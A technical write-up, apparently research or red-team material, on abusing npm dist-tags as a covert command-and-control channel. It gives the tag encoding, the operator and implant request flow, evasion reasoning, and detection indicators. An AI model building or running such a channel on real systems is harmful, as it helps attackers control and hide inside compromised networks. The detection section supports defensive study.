##### Abusing npm Registry for C2

Commands are encoded as npm dist-tag names on a controlled package. The
implant polls the public registry API endpoint, reads tags matching a
known prefix, executes the decoded command, and writes results back as
new tags.

No authentication is needed to read tags. Writing tags requires an npm
token with package write access.

![npm registry](npm_logo.png)

#### How It Works

npm dist-tags are key-value pairs attached to published packages. They
normally map human-readable names to version strings ("latest" -> "1.0.0").
The registry allows arbitrary tag names up to 250 characters, restricted
to [a-zA-Z0-9._-].

The operator creates tags with names following this format:

    <prefix><nonce>_<base64url(payload)>

Prefixes distinguish tag types:

| prefix | meaning | who writes |
|--------|---------|------------|
| cmm_ | command | operator |
| res_ | result | implant |
| hbt_ | heartbeat | implant |

The tag value is always "1.0.0" (the single published version). The value
itself carries no data -- all information is in the tag name.

Communication flow:

    operator:  PUT /-/package/<name>/dist-tags/cmm_<b64>
    implant:   GET  /-/package/<name>/dist-tags  (no auth)
    implant:   decode cmm_*, execute command
    implant:   PUT /-/package/<name>/dist-tags/res_<b64>
    operator:  GET  /-/package/<name>/dist-tags
    operator:  decode res_*, read output

The implant polls at a configurable interval with jitter. Every 10 cycles
it writes a heartbeat tag (hbt_<nonce>) to signal liveness.

#### Why It Is Hard To Detect

1. The traffic goes to registry.npmjs.org, which is whitelisted by most
   corporate proxies for npm install.

2. HTTP requests to read dist-tags are GETs to a Cloudflare-cached
   endpoint, identical to what npm outdated or renovate produce.

3. No credentials are required for reading. The implant never stores or
   sends secrets.

4. dist-tags are invisible in the npm web UI. They appear only in the
   API response and are not shown on package pages or README files.

5. The tag names look like random strings (base64url). They do not stand
   out in registry logs.

6. The published package is minimal (a single package.json). No malicious
   code is ever published -- only metadata tags are manipulated.

#### Key Detection Opportunities

1. A non-Node.js process making periodic GET requests to
   registry.npmjs.org is anomalous on machines where Node.js
   development is not standard.

2. The polling pattern (regular intervals with jitter) is detectable
   through statistical analysis of outbound HTTPS timing.

3. User-Agent mismatch: Python's urllib sends
   "Python-urllib/3.x" by default, which differs from the npm CLI
   User-Agent "npm/<version> node/<version> <platform>".

4. TLS fingerprint (JA3) of Python differs from Node.js if default
   SSL contexts are used.

5. Process name: python.exe making npm registry calls stands out
   compared to node.exe.

6. An npm token stored on disk or in memory in a non-Node.js
   context suggests abuse.

#### References

- npm dist-tags API: https://github.com/npm/registry/blob/master/docs/SPEC.md
- npm granular access tokens: https://docs.npmjs.com/creating-and-viewing-access-tokens
